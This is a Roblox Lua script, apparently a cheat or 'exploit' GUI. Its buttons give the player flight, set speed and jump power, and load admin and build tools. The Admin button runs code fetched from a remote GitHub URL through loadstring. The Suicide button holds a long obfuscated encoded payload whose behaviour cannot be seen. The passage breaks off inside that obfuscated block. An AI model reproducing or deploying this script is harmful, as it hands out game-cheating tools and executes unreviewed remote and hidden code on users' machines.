local CMDS = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local TItle2 = Instance.new("TextLabel")
local Fly = Instance.new("TextButton")
local Walkspeed = Instance.new("TextButton")
local Input = Instance.new("TextBox")
local Jumppower = Instance.new("TextButton")
local HomebrewAdmin = Instance.new("TextButton")
local Suicide = Instance.new("TextButton")
local Zombie = Instance.new("TextButton")
local LaserArm = Instance.new("TextButton")
local Btools = Instance.new("TextButton")
local c00lgui = Instance.new("TextButton")

--Properties:

CMDS.Name = "CMDS"
CMDS.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
CMDS.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = CMDS
Frame.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
Frame.BackgroundTransparency = 0.100
Frame.Position = UDim2.new(0.277016729, 0, 0.203703701, 0)
Frame.Size = UDim2.new(0, 660, 0, 378)

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.276334137, 0, 0.0357142873, 0)
Title.Size = UDim2.new(0, 294, 0, 61)
Title.Font = Enum.Font.SourceSansBold
Title.Text = "FE CMDS GUI"
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.TextSize = 50.000
Title.TextWrapped = true

TItle2.Name = "TItle2"
TItle2.Parent = Frame
TItle2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TItle2.BackgroundTransparency = 1.000
TItle2.Position = UDim2.new(0.198960528, 0, 0.130832121, 0)
TItle2.Size = UDim2.new(0, 395, 0, 61)
TItle2.Font = Enum.Font.SourceSansBold
TItle2.Text = "Welcome to ohio's most normal CMDS GUI!"
TItle2.TextColor3 = Color3.fromRGB(148, 255, 7)
TItle2.TextSize = 20.000
TItle2.TextWrapped = true

Fly.Name = "Fly"
Fly.Parent = Frame
Fly.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
Fly.BorderColor3 = Color3.fromRGB(157, 14, 14)
Fly.BorderSizePixel = 8
Fly.Position = UDim2.new(0.0772533044, 0, 0.31601727, 0)
Fly.Size = UDim2.new(0, 138, 0, 42)
Fly.Font = Enum.Font.SourceSansBold
Fly.Text = "Fly [E]"
Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
Fly.TextSize = 30.000

Walkspeed.Name = "Walkspeed"
Walkspeed.Parent = Frame
Walkspeed.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
Walkspeed.BorderColor3 = Color3.fromRGB(157, 14, 14)
Walkspeed.BorderSizePixel = 8
Walkspeed.Position = UDim2.new(0.392404824, 0, 0.31601727, 0)
Walkspeed.Size = UDim2.new(0, 144, 0, 42)
Walkspeed.Font = Enum.Font.SourceSansBold
Walkspeed.Text = "Walkspeed"
Walkspeed.TextColor3 = Color3.fromRGB(255, 255, 255)
Walkspeed.TextSize = 30.000

Input.Name = "Input"
Input.Parent = Frame
Input.BackgroundColor3 = Color3.fromRGB(98, 98, 98)
Input.BackgroundTransparency = 0.300
Input.Position = UDim2.new(0, 0, 0.931216955, 0)
Input.Size = UDim2.new(0, 660, 0, 26)
Input.Font = Enum.Font.SourceSansBold
Input.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
Input.Text = "Input"
Input.TextColor3 = Color3.fromRGB(255, 255, 255)
Input.TextSize = 20.000

Jumppower.Name = "Jumppower"
Jumppower.Parent = Frame
Jumppower.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
Jumppower.BorderColor3 = Color3.fromRGB(157, 14, 14)
Jumppower.BorderSizePixel = 8
Jumppower.Position = UDim2.new(0.721192718, 0, 0.31601727, 0)
Jumppower.Size = UDim2.new(0, 138, 0, 42)
Jumppower.Font = Enum.Font.SourceSansBold
Jumppower.Text = "Jumppower"
Jumppower.TextColor3 = Color3.fromRGB(255, 255, 255)
Jumppower.TextSize = 30.000

HomebrewAdmin.Name = "Homebrew Admin"
HomebrewAdmin.Parent = Frame
HomebrewAdmin.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
HomebrewAdmin.BorderColor3 = Color3.fromRGB(157, 14, 14)
HomebrewAdmin.BorderSizePixel = 8
HomebrewAdmin.Position = UDim2.new(0.721192718, 0, 0.514429986, 0)
HomebrewAdmin.Size = UDim2.new(0, 138, 0, 42)
HomebrewAdmin.Font = Enum.Font.SourceSansBold
HomebrewAdmin.Text = "Admin"
HomebrewAdmin.TextColor3 = Color3.fromRGB(255, 255, 255)
HomebrewAdmin.TextSize = 30.000

Suicide.Name = "Suicide"
Suicide.Parent = Frame
Suicide.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
Suicide.BorderColor3 = Color3.fromRGB(157, 14, 14)
Suicide.BorderSizePixel = 8
Suicide.Position = UDim2.new(0.392404824, 0, 0.514429986, 0)
Suicide.Size = UDim2.new(0, 144, 0, 42)
Suicide.Font = Enum.Font.SourceSansBold
Suicide.Text = "Suicide"
Suicide.TextColor3 = Color3.fromRGB(255, 255, 255)
Suicide.TextSize = 30.000

Zombie.Name = "Zombie"
Zombie.Parent = Frame
Zombie.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
Zombie.BorderColor3 = Color3.fromRGB(157, 14, 14)
Zombie.BorderSizePixel = 8
Zombie.Position = UDim2.new(0.0772533044, 0, 0.514429986, 0)
Zombie.Size = UDim2.new(0, 138, 0, 42)
Zombie.Font = Enum.Font.SourceSansBold
Zombie.Text = "Zombie"
Zombie.TextColor3 = Color3.fromRGB(255, 255, 255)
Zombie.TextSize = 30.000

LaserArm.Name = "Laser Arm"
LaserArm.Parent = Frame
LaserArm.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
LaserArm.BorderColor3 = Color3.fromRGB(157, 14, 14)
LaserArm.BorderSizePixel = 8
LaserArm.Position = UDim2.new(0.721192718, 0, 0.712842703, 0)
LaserArm.Size = UDim2.new(0, 138, 0, 42)
LaserArm.Font = Enum.Font.SourceSansBold
LaserArm.Text = "Laser Arm"
LaserArm.TextColor3 = Color3.fromRGB(255, 255, 255)
LaserArm.TextSize = 30.000

Btools.Name = "Btools"
Btools.Parent = Frame
Btools.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
Btools.BorderColor3 = Color3.fromRGB(157, 14, 14)
Btools.BorderSizePixel = 8
Btools.Position = UDim2.new(0.392404824, 0, 0.712842703, 0)
Btools.Size = UDim2.new(0, 144, 0, 42)
Btools.Font = Enum.Font.SourceSansBold
Btools.Text = "BTools"
Btools.TextColor3 = Color3.fromRGB(255, 255, 255)
Btools.TextSize = 30.000

c00lgui.Name = "c00lgui"
c00lgui.Parent = Frame
c00lgui.BackgroundColor3 = Color3.fromRGB(225, 0, 0)
c00lgui.BorderColor3 = Color3.fromRGB(157, 14, 14)
c00lgui.BorderSizePixel = 8
c00lgui.Position = UDim2.new(0.0772533044, 0, 0.712842703, 0)
c00lgui.Size = UDim2.new(0, 138, 0, 42)
c00lgui.Font = Enum.Font.SourceSansBold
c00lgui.Text = "c00lgui"
c00lgui.TextColor3 = Color3.fromRGB(255, 255, 255)
c00lgui.TextSize = 30.000

-- Scripts:

local function XLPT_fake_script() -- Fly.LocalScript 
	local script = Instance.new('LocalScript', Fly)

	script.Parent.MouseButton1Click:Connect(function()
		repeat wait()
		until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
		local mouse = game.Players.LocalPlayer:GetMouse()
		repeat wait() until mouse
		local plr = game.Players.LocalPlayer
		local torso = plr.Character.Torso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0
	
		function Fly()
			local bg = Instance.new("BodyGyro", torso)
			bg.P = 9e4
			bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			bg.cframe = torso.CFrame
			local bv = Instance.new("BodyVelocity", torso)
			bv.velocity = Vector3.new(0,0.1,0)
			bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
			repeat wait()
				plr.Character.Humanoid.PlatformStand = true
				if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
					speed = speed+.5+(speed/maxspeed)
					if speed > maxspeed then
						speed = maxspeed
					end
				elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
					speed = speed-1
					if speed < 0 then
						speed = 0
					end
				end
				if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
					lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
				elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				else
					bv.velocity = Vector3.new(0,0.1,0)
				end
				bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
			until not flying
			ctrl = {f = 0, b = 0, l = 0, r = 0}
			lastctrl = {f = 0, b = 0, l = 0, r = 0}
			speed = 0
			bg:Destroy()
			bv:Destroy()
			plr.Character.Humanoid.PlatformStand = false
		end
		mouse.KeyDown:connect(function(key)
			if key:lower() == "e" then
				if flying then flying = false
				else
					flying = true
					Fly()
				end
			elseif key:lower() == "w" then
				ctrl.f = 1
			elseif key:lower() == "s" then
				ctrl.b = -1
			elseif key:lower() == "a" then
				ctrl.l = -1
			elseif key:lower() == "d" then
				ctrl.r = 1
			end
		end)
		mouse.KeyUp:connect(function(key)
			if key:lower() == "w" then
				ctrl.f = 0
			elseif key:lower() == "s" then
				ctrl.b = 0
			elseif key:lower() == "a" then
				ctrl.l = 0
			elseif key:lower() == "d" then
				ctrl.r = 0
			end
		end)
		Fly()
	end)
end
coroutine.wrap(XLPT_fake_script)()
local function RHWH_fake_script() -- Walkspeed.LocalScript 
	local script = Instance.new('LocalScript', Walkspeed)

	script.Parent.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = script.Parent.Parent.Input.Text
	end)
end
coroutine.wrap(RHWH_fake_script)()
local function GCWG_fake_script() -- Jumppower.LocalScript 
	local script = Instance.new('LocalScript', Jumppower)

	script.Parent.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = script.Parent.Parent.Input.Text
	end)
end
coroutine.wrap(GCWG_fake_script)()
local function XEUCSSM_fake_script() -- HomebrewAdmin.LocalScript 
	local script = Instance.new('LocalScript', HomebrewAdmin)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Syntaxx64/HomebrewAdmin/master/Main"))()
	end)
end
coroutine.wrap(XEUCSSM_fake_script)()
local function VVCPTG_fake_script() -- Suicide.LocalScript 
	local script = Instance.new('LocalScript', Suicide)

	script.Parent.MouseButton1Click:Connect(function()
		--[[
	Made By Raaziez!
	
	Enjoy!
	]]
		return(function(snap_IIIllIIIlllIIlIlll,snap_llIIlIlIlIllIlIl,snap_llIIlIlIlIllIlIl)local snap_lIlIlIIIIIlIIlIlllI=string.char;local snap_IIllIlIllIIlIlIIII=string.sub;local snap_llIlllIllIlIIIIlllIIl=table.concat;local snap_IlIllIlllIIllI=math.ldexp;local snap_llllllllIIllllIlI=getfenv or function()return _ENV end;local snap_IlIllIllIIlll=select;local snap_lllIllIIlIIIIlIllIlllIlI=unpack or table.unpack;local snap_IIIIlllIllllIIIIIlIll=tonumber;local function snap_IlllllIlIIIIIIIlll(snap_lllIllIIlIIIIlIllIlllIlI)local snap_llIIlIIlIlIllIl,snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIIlllIIIIIlIllllII="","",{}local snap_IlIlIIlIlIllIllIl=256;local snap_lIIlIIIllIIlIIIlI={}for snap_llIIlIlIlIllIlIl=0,snap_IlIlIIlIlIllIllIl-1 do snap_lIIlIIIllIIlIIIlI[snap_llIIlIlIlIllIlIl]=snap_lIlIlIIIIIlIIlIlllI(snap_llIIlIlIlIllIlIl)end;local snap_llIIlIlIlIllIlIl=1;local function snap_IIIllIIIlllIIlIlll()local snap_llIIlIIlIlIllIl=snap_IIIIlllIllllIIIIIlIll(snap_IIllIlIllIIlIlIIII(snap_lllIllIIlIIIIlIllIlllIlI,snap_llIIlIlIlIllIlIl,snap_llIIlIlIlIllIlIl),36)snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl+1;local snap_lIllIlIIIllIIIllIlIlllIlI=snap_IIIIlllIllllIIIIIlIll(snap_IIllIlIllIIlIlIIII(snap_lllIllIIlIIIIlIllIlllIlI,snap_llIIlIlIlIllIlIl,snap_llIIlIlIlIllIlIl+snap_llIIlIIlIlIllIl-1),36)snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl+snap_llIIlIIlIlIllIl;return snap_lIllIlIIIllIIIllIlIlllIlI end;snap_llIIlIIlIlIllIl=snap_lIlIlIIIIIlIIlIlllI(snap_IIIllIIIlllIIlIlll())snap_IIIlllIIIIIlIllllII[1]=snap_llIIlIIlIlIllIl;while snap_llIIlIlIlIllIlIl<#snap_lllIllIIlIIIIlIllIlllIlI do local snap_llIIlIlIlIllIlIl=snap_IIIllIIIlllIIlIlll()if snap_lIIlIIIllIIlIIIlI[snap_llIIlIlIlIllIlIl]then snap_lIllIlIIIllIIIllIlIlllIlI=snap_lIIlIIIllIIlIIIlI[snap_llIIlIlIlIllIlIl]else snap_lIllIlIIIllIIIllIlIlllIlI=snap_llIIlIIlIlIllIl..snap_IIllIlIllIIlIlIIII(snap_llIIlIIlIlIllIl,1,1)end;snap_lIIlIIIllIIlIIIlI[snap_IlIlIIlIlIllIllIl]=snap_llIIlIIlIlIllIl..snap_IIllIlIllIIlIlIIII(snap_lIllIlIIIllIIIllIlIlllIlI,1,1)snap_IIIlllIIIIIlIllllII[#snap_IIIlllIIIIIlIllllII+1],snap_llIIlIIlIlIllIl,snap_IlIlIIlIlIllIllIl=snap_lIllIlIIIllIIIllIlIlllIlI,snap_lIllIlIIIllIIIllIlIlllIlI,snap_IlIlIIlIlIllIllIl+1 end;return table.concat(snap_IIIlllIIIIIlIllllII)end;local snap_IIIIlllIllllIIIIIlIll=snap_IlllllIlIIIIIIIlll('21L1L2751M1G2751L22U22T23822Q23F1M1H27923623823C2341M1I27921X23D23823023422V22U1M1U27922H23E23A23823D27Q27S27U1M1S27922E23H23822V23823A22P28728927521Z23G23623H22P21H22C22V23C27X27922F22V23423823I22N23E23G23F22P27W1T27922K23F22U22P23823F23A27M1M27923F23422Q1M1527922C23D28M23F22I22V23G23429423822P23G23E27F27H27522L28Y2351M1O29O29Q23623F21X23E22U23G29Z2A11M1V29O22P29C23A23H27L29427727921T23E27V23E28U27522C2AN28F2AQ29W22P2112AZ1L2B12AO2B42942101M1R27921Z23427B2A12AG22R29W2BJ22U2792BR23G22D1M1Q2BH28M23G2352AH23022823F23823B23D2342351K1K1M29727522H23423728P28R28T2CD1L2AE2AG2AI27F27O27521V23428G2AW2122BR27926L2162CY27526D2D12D227627Y27529T29V29X2CP2D224523722D2D626L24Q2DE23725X27G27922Q2382AH2D626T2D52CY1X2DH2D21X25X2D62292E123Z23W2E62E624S2161M1P2AU28E29A27C28X29E2302CC27922L22O23C29D2922A71J2EL28Y23D22P23H2DE21W2DY2CY22K2F02BR2172F327921D2BU2CR1L2292BJ22P22V23E2301L24P279172BG2751K2791N2892FO2CY29N2751N1L2FO172BR2FW27521H2D229H2G32CY27H2G62BR2782G62FS1L2ES2G62FW2FO2FA1L2FW2GH1L2FZ2GK1L2CL2GG2GP2892GO29H2AL2G22752A31L2D82FV1L27H2FW2GV2GQ2792G629H29H2GU2GZ1L2EC2GY1L2782752H21L29H2782H62HE2GR2HE27H2HD2HI1L2A92CY2ES2GD27927H2ES2HP2HV2HR2HV2782HU2ES2HX1L2G62FA2FM27527827O2FW2FU29H2BW27H2IK1L29N2782FU2FW2IM2IP2H32IQ1L2112H3142GN2IY2H3161L112J32HM1L2J12FZ2IZ2J92J52J72G62ES275102IC27527O2ES2GJ2II2FX2J21L27O2I627O27O2HU2972GX2JL1L28J2H12BR2JX2GP2GO2972I62K92K22JS2892HG2K12K02HL2JZ2K72752892I62892KO2JS2AL2IB27927Y2JI2BR28927Y2I42AL2I62AL2AL2HU27Y2IB2G62KF2IF1L2AL2EC2IJ2752972BW2892FU29729N2AL2FU27O2LG2IV2JT2IV2AL2JD27O2JB2J827O2JF2J82972LV2JD2972LY2GO27Y122H92HK2K42HU2EC1D2FK2752A91C2ME1L2BG1F2D227Y2BG2LD2KC132K42M51L2M72HH27Y27Y2MB1L192MI2A92ML2752GO2MK2MM2MJ2GP152G32891E2MS1B2K42MV2K12MX2KC2GO2EC182N21L2MH2N52752N72CY2MN2NA2HE2MR27Y2MT2NI2G62NK2MZ2NG2NS2HW1L2N42JS2NU2BR2NW2MP27H2NE2O02M91A2MI2EC2G92KT2GP2FY2M92O22M92MY2JS2MC2NP2NR2OB2O92N82MO2LP2892NZ2JS2M62M82K42OU2NM2N02NP2OA2N61L21G2P12NX2KC2OH2P62MU2P82O42OV1L2NO2O72MG2MI2OC2OO2P22FU27H2P52O12PO2MA2PQ2O62JS2N32PV1L21J2PI2OF1L2PL2MT2OK2O72EC2OY2OO2GM2Q22MW2Q42PB2MD2PT2NQ2Q92OA2PX2PJ2P42MS2OR2Q32PA2752EC2N12QS21I2Q92PH2NV2N92MP2ND2QZ2NH2R12NL2R32PR2OX2QU2QC2LP2Q02RE2P72QO2R22HF1L2Q62GO2A92R72O72BG2QB2RA2PY2HE2QF2OJ2OL1L21D2N82GM2O32OO2112FW27Y21C2QT2SC27521F2J827Y21E1L21P2PM2QH2PQ2S92RA2SB2M92SK2SM1L2SO21O2SR2S72SU2LE2K42SW2K42SY2JD2SN1L21R2T32QI2S82SA2JR2SJ1L2SL2TB2T01L21Q2TF2PQ2QK2M92SB2J52H227Y21H2R72NK2742H82KY2JR1L2QR2U52U82K02DO2752DQ2AH1M2J127522U2342EW2BZ23529W22T2FF22T27U22P2EJ2H027J27L27N27P27R27T27V2B82802822842UZ2872FU1L21Y23G23C22O27R2CP21Z2382C022O27W2H02EO2EW1M29H27522T23E29L2H023H22O23627M2NI22G2382312VB2EN2VA2VC2VE2A023F2VG2VI2BQ2G92FL2792I02R52JR2FW1J2R91L2OK2GD1H2PS2WM2JR2WE2H32N52J72FO2VP2K12FO2FO2G82FN2JR2782GO2WJ2MI29H2FA2HA2J92972GO27H2XA2HS2RH2HV2XG2I72KC2792HN2D62WF2JS2WU2JS2WX2P82X02H42WZ2X42JS2FW2K02H72XK2HB2H82XE2LQ2HH27H2HT2JS2IH2P82782I82BR2XO2XP2JR2H02XQ2U62YM2CY');local snap_llIIlIlIlIllIlIl=(bit or bit32);local snap_IlIlIIlIlIllIllIl=snap_llIIlIlIlIllIlIl and snap_llIIlIlIlIllIlIl.bxor or function(snap_llIIlIlIlIllIlIl,snap_lIllIlIIIllIIIllIlIlllIlI)local snap_llIIlIIlIlIllIl,snap_IlIlIIlIlIllIllIl,snap_IIllIlIllIIlIlIIII=1,0,10 while snap_llIIlIlIlIllIlIl>0 and snap_lIllIlIIIllIIIllIlIlllIlI>0 do local snap_IIllIlIllIIlIlIIII,snap_IIIlllIIIIIlIllllII=snap_llIIlIlIlIllIlIl%2,snap_lIllIlIIIllIIIllIlIlllIlI%2 if snap_IIllIlIllIIlIlIIII~=snap_IIIlllIIIIIlIllllII then snap_IlIlIIlIlIllIllIl=snap_IlIlIIlIlIllIllIl+snap_llIIlIIlIlIllIl end snap_llIIlIlIlIllIlIl,snap_lIllIlIIIllIIIllIlIlllIlI,snap_llIIlIIlIlIllIl=(snap_llIIlIlIlIllIlIl-snap_IIllIlIllIIlIlIIII)/2,(snap_lIllIlIIIllIIIllIlIlllIlI-snap_IIIlllIIIIIlIllllII)/2,snap_llIIlIIlIlIllIl*2 end if snap_llIIlIlIlIllIlIl<snap_lIllIlIIIllIIIllIlIlllIlI then snap_llIIlIlIlIllIlIl=snap_lIllIlIIIllIIIllIlIlllIlI end while snap_llIIlIlIlIllIlIl>0 do local snap_lIllIlIIIllIIIllIlIlllIlI=snap_llIIlIlIlIllIlIl%2 if snap_lIllIlIIIllIIIllIlIlllIlI>0 then snap_IlIlIIlIlIllIllIl=snap_IlIlIIlIlIllIllIl+snap_llIIlIIlIlIllIl end snap_llIIlIlIlIllIlIl,snap_llIIlIIlIlIllIl=(snap_llIIlIlIlIllIlIl-snap_lIllIlIIIllIIIllIlIlllIlI)/2,snap_llIIlIIlIlIllIl*2 end return snap_IlIlIIlIlIllIllIl end local function snap_lIllIlIIIllIIIllIlIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_llIIlIlIlIllIlIl,snap_llIIlIIlIlIllIl)if snap_llIIlIIlIlIllIl then local snap_llIIlIlIlIllIlIl=(snap_lIllIlIIIllIIIllIlIlllIlI/2^(snap_llIIlIlIlIllIlIl-1))%2^((snap_llIIlIIlIlIllIl-1)-(snap_llIIlIlIlIllIlIl-1)+1);return snap_llIIlIlIlIllIlIl-snap_llIIlIlIlIllIlIl%1;else local snap_llIIlIlIlIllIlIl=2^(snap_llIIlIlIlIllIlIl-1);return(snap_lIllIlIIIllIIIllIlIlllIlI%(snap_llIIlIlIlIllIlIl+snap_llIIlIlIlIllIlIl)>=snap_llIIlIlIlIllIlIl)and 1 or 0;end;end;local snap_llIIlIlIlIllIlIl=1;local function snap_llIIlIIlIlIllIl()local snap_IIllIlIllIIlIlIIII,snap_llIIlIIlIlIllIl,snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIIlllIIIIIlIllllII=snap_IIIllIIIlllIIlIlll(snap_IIIIlllIllllIIIIIlIll,snap_llIIlIlIlIllIlIl,snap_llIIlIlIlIllIlIl+3);snap_IIllIlIllIIlIlIIII=snap_IlIlIIlIlIllIllIl(snap_IIllIlIllIIlIlIIII,21)snap_llIIlIIlIlIllIl=snap_IlIlIIlIlIllIllIl(snap_llIIlIIlIlIllIl,21)snap_lIllIlIIIllIIIllIlIlllIlI=snap_IlIlIIlIlIllIllIl(snap_lIllIlIIIllIIIllIlIlllIlI,21)snap_IIIlllIIIIIlIllllII=snap_IlIlIIlIlIllIllIl(snap_IIIlllIIIIIlIllllII,21)snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl+4;return(snap_IIIlllIIIIIlIllllII*16777216)+(snap_lIllIlIIIllIIIllIlIlllIlI*65536)+(snap_llIIlIIlIlIllIl*256)+snap_IIllIlIllIIlIlIIII;end;local function snap_lIIlIIIllIIlIIIlI()local snap_llIIlIIlIlIllIl=snap_IlIlIIlIlIllIllIl(snap_IIIllIIIlllIIlIlll(snap_IIIIlllIllllIIIIIlIll,snap_llIIlIlIlIllIlIl,snap_llIIlIlIlIllIlIl),21);snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl+1;return snap_llIIlIIlIlIllIl;end;local function snap_IIIlllIIIIIlIllllII()local snap_lIllIlIIIllIIIllIlIlllIlI,snap_llIIlIIlIlIllIl=snap_IIIllIIIlllIIlIlll(snap_IIIIlllIllllIIIIIlIll,snap_llIIlIlIlIllIlIl,snap_llIIlIlIlIllIlIl+2);snap_lIllIlIIIllIIIllIlIlllIlI=snap_IlIlIIlIlIllIllIl(snap_lIllIlIIIllIIIllIlIlllIlI,21)snap_llIIlIIlIlIllIl=snap_IlIlIIlIlIllIllIl(snap_llIIlIIlIlIllIl,21)snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl+2;return(snap_llIIlIIlIlIllIl*256)+snap_lIllIlIIIllIIIllIlIlllIlI;end;local function snap_IlllIIllIIlIIIlIlIIIlI()local snap_IlIlIIlIlIllIllIl=snap_llIIlIIlIlIllIl();local snap_llIIlIlIlIllIlIl=snap_llIIlIIlIlIllIl();local snap_IIllIlIllIIlIlIIII=1;local snap_IlIlIIlIlIllIllIl=(snap_lIllIlIIIllIIIllIlIlllIlI(snap_llIIlIlIlIllIlIl,1,20)*(2^32))+snap_IlIlIIlIlIllIllIl;local snap_llIIlIIlIlIllIl=snap_lIllIlIIIllIIIllIlIlllIlI(snap_llIIlIlIlIllIlIl,21,31);local snap_llIIlIlIlIllIlIl=((-1)^snap_lIllIlIIIllIIIllIlIlllIlI(snap_llIIlIlIlIllIlIl,32));if(snap_llIIlIIlIlIllIl==0)then if(snap_IlIlIIlIlIllIllIl==0)then return snap_llIIlIlIlIllIlIl*0;else snap_llIIlIIlIlIllIl=1;snap_IIllIlIllIIlIlIIII=0;end;elseif(snap_llIIlIIlIlIllIl==2047)then return(snap_IlIlIIlIlIllIllIl==0)and(snap_llIIlIlIlIllIlIl*(1/0))or(snap_llIIlIlIlIllIlIl*(0/0));end;return snap_IlIllIlllIIllI(snap_llIIlIlIlIllIlIl,snap_llIIlIIlIlIllIl-1023)*(snap_IIllIlIllIIlIlIIII+(snap_IlIlIIlIlIllIllIl/(2^52)));end;local snap_IlllllIlIIIIIIIlll=snap_llIIlIIlIlIllIl;local function snap_IlIllIlllIIllI(snap_llIIlIIlIlIllIl)local snap_lIllIlIIIllIIIllIlIlllIlI;if(not snap_llIIlIIlIlIllIl)then snap_llIIlIIlIlIllIl=snap_IlllllIlIIIIIIIlll();if(snap_llIIlIIlIlIllIl==0)then return'';end;end;snap_lIllIlIIIllIIIllIlIlllIlI=snap_IIllIlIllIIlIlIIII(snap_IIIIlllIllllIIIIIlIll,snap_llIIlIlIlIllIlIl,snap_llIIlIlIlIllIlIl+snap_llIIlIIlIlIllIl-1);snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl+snap_llIIlIIlIlIllIl;local snap_llIIlIIlIlIllIl={}for snap_llIIlIlIlIllIlIl=1,#snap_lIllIlIIIllIIIllIlIlllIlI do snap_llIIlIIlIlIllIl[snap_llIIlIlIlIllIlIl]=snap_lIlIlIIIIIlIIlIlllI(snap_IlIlIIlIlIllIllIl(snap_IIIllIIIlllIIlIlll(snap_IIllIlIllIIlIlIIII(snap_lIllIlIIIllIIIllIlIlllIlI,snap_llIIlIlIlIllIlIl,snap_llIIlIlIlIllIlIl)),21))end return snap_llIlllIllIlIIIIlllIIl(snap_llIIlIIlIlIllIl);end;local snap_llIIlIlIlIllIlIl=snap_llIIlIIlIlIllIl;local function snap_llIlllIllIlIIIIlllIIl(...)return{...},snap_IlIllIllIIlll('#',...)end local function snap_IIIllIIIlllIIlIlll()local snap_lIlIlIIIIIlIIlIlllI={};local snap_IIIIlllIllllIIIIIlIll={};local snap_llIIlIlIlIllIlIl={};local snap_lllIllIIlIIIIlIllIlllIlI={[#{{580;182;548;651};"1 + 1 = 111";}]=snap_IIIIlllIllllIIIIIlIll,[#{"1 + 1 = 111";"1 + 1 = 111";{447;585;150;446};}]=nil,[#{{111;800;296;654};"1 + 1 = 111";{737;421;35;828};{386;57;571;921};}]=snap_llIIlIlIlIllIlIl,[#{"1 + 1 = 111";}]=snap_lIlIlIIIIIlIIlIlllI,};local snap_llIIlIlIlIllIlIl=snap_llIIlIIlIlIllIl()local snap_IIllIlIllIIlIlIIII={}for snap_lIllIlIIIllIIIllIlIlllIlI=1,snap_llIIlIlIlIllIlIl do local snap_llIIlIIlIlIllIl=snap_lIIlIIIllIIlIIIlI();local snap_llIIlIlIlIllIlIl;if(snap_llIIlIIlIlIllIl==1)then snap_llIIlIlIlIllIlIl=(snap_lIIlIIIllIIlIIIlI()~=0);elseif(snap_llIIlIIlIlIllIl==0)then snap_llIIlIlIlIllIlIl=snap_IlllIIllIIlIIIlIlIIIlI();elseif(snap_llIIlIIlIlIllIl==3)then snap_llIIlIlIlIllIlIl=snap_IlIllIlllIIllI();end;snap_IIllIlIllIIlIlIIII[snap_lIllIlIIIllIIIllIlIlllIlI]=snap_llIIlIlIlIllIlIl;end;snap_lllIllIIlIIIIlIllIlllIlI[3]=snap_lIIlIIIllIIlIIIlI();for snap_lllIllIIlIIIIlIllIlllIlI=1,snap_llIIlIIlIlIllIl()do local snap_llIIlIlIlIllIlIl=snap_lIIlIIIllIIlIIIlI();if(snap_lIllIlIIIllIIIllIlIlllIlI(snap_llIIlIlIlIllIlIl,1,1)==0)then local snap_IlIlIIlIlIllIllIl=snap_lIllIlIIIllIIIllIlIlllIlI(snap_llIIlIlIlIllIlIl,2,3);local snap_lIIlIIIllIIlIIIlI=snap_lIllIlIIIllIIIllIlIlllIlI(snap_llIIlIlIlIllIlIl,4,6);local snap_llIIlIlIlIllIlIl={snap_IIIlllIIIIIlIllllII(),snap_IIIlllIIIIIlIllllII(),nil,nil};if(snap_IlIlIIlIlIllIllIl==0)then snap_llIIlIlIlIllIlIl[3]=snap_IIIlllIIIIIlIllllII();snap_llIIlIlIlIllIlIl[4]=snap_IIIlllIIIIIlIllllII();elseif(snap_IlIlIIlIlIllIllIl==1)then 